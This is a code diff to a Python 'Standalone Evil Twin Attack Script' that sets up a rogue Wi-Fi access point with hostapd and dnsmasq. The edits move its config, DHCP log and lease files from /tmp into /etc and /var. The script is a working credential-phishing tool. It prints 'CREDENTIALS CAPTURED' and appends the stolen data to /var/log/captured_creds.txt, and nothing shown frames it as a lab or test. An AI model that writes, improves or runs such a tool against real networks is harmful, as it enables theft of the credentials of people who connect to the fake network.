@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 Standalone Evil Twin Attack Script
-Based on research from working GitHub projects (2024-2025)
+NO /tmp/ FILES - Everything in /etc/
 """
 
 import subprocess
@@ -25,9 +25,11 @@ class EvilTwinAttack:
         self.dhcp_range_start = "10.0.0.10"
         self.dhcp_range_end = "10.0.0.100"
 
-        # Config file paths
+        # Config file paths - ALL in /etc/
         self.hostapd_conf = "/etc/hostapd/evil_twin.conf"
         self.dnsmasq_conf = "/etc/dnsmasq.d/evil_twin.conf"
+        self.dnsmasq_log = "/var/log/dnsmasq_evil.log"
+        self.dnsmasq_leases = "/var/lib/misc/dnsmasq.leases"
 
 
     def check_root(self):
@@ -91,7 +93,7 @@ class EvilTwinAttack:
         print("[*] Creating hostapd config...")
 
         # Ensure /etc/hostapd/ exists
-        subprocess.run(["mkdir", "-p", "/etc/hostapd"], check=False)
+        subprocess.run(["mkdir", "-p", "/etc/hostapd"], check=True)
 
         config = f"""interface={self.interface}
 driver=nl80211
@@ -103,15 +105,11 @@ auth_algs=1
 ignore_broadcast_ssid=0
 """
 
-        # Write to temp first, then copy
-        temp_file = "/tmp/hostapd_temp.conf"
-        with open(temp_file, 'w') as f:
+        # Write directly to /etc/hostapd/
+        with open(self.hostapd_conf, 'w') as f:
             f.write(config)
 
-        # Copy to /etc/hostapd/
-        subprocess.run(["cp", temp_file, self.hostapd_conf], check=True)
         subprocess.run(["chmod", "644", self.hostapd_conf], check=True)
-
         print(f"[+] hostapd config created: {self.hostapd_conf}")
 
 
@@ -120,7 +118,9 @@ ignore_broadcast_ssid=0
         print("[*] Creating dnsmasq config...")
 
         # Ensure /etc/dnsmasq.d/ exists
-        subprocess.run(["mkdir", "-p", "/etc/dnsmasq.d"], check=False)
+        subprocess.run(["mkdir", "-p", "/etc/dnsmasq.d"], check=True)
+        subprocess.run(["mkdir", "-p", "/var/lib/misc"], check=True)
+        subprocess.run(["mkdir", "-p", "/var/log"], check=True)
 
         # KEY FIX: port=0 disables DNS, only DHCP
         config = f"""# Disable DNS (CRITICAL - avoids port 53 conflicts)
@@ -138,21 +138,17 @@ dhcp-authoritative
 
 # Logging
 log-dhcp
-log-facility=/tmp/dnsmasq.log
+log-facility={self.dnsmasq_log}
 
 # Lease file
-dhcp-leasefile=/tmp/dnsmasq.leases
+dhcp-leasefile={self.dnsmasq_leases}
 """
 
-        # Write to temp file first, then move it
-        temp_file = "/tmp/dnsmasq_temp.conf"
-        with open(temp_file, 'w') as f:
+        # Write directly to /etc/dnsmasq.d/
+        with open(self.dnsmasq_conf, 'w') as f:
             f.write(config)
 
-        # Copy to /etc/dnsmasq.d/ with sudo
-        subprocess.run(["cp", temp_file, self.dnsmasq_conf], check=True)
         subprocess.run(["chmod", "644", self.dnsmasq_conf], check=True)
-
         print(f"[+] dnsmasq config created: {self.dnsmasq_conf}")
 
 
@@ -219,7 +215,7 @@ dhcp-leasefile=/tmp/dnsmasq.leases
             return True
         else:
             print("[!] dnsmasq running but not listening on port 67")
-            print("[!] Check /tmp/dnsmasq.log for errors")
+            print(f"[!] Check {self.dnsmasq_log} for errors")
             return False
 
 
@@ -241,7 +237,7 @@ dhcp-leasefile=/tmp/dnsmasq.leases
                         print(f"\n[!] CREDENTIALS CAPTURED: {data}\n")
 
                         # Save to file
-                        with open("/tmp/captured_creds.txt", "a") as f:
+                        with open("/var/log/captured_creds.txt", "a") as f:
                             f.write(f"{data}\n")
                     except:
                         pass
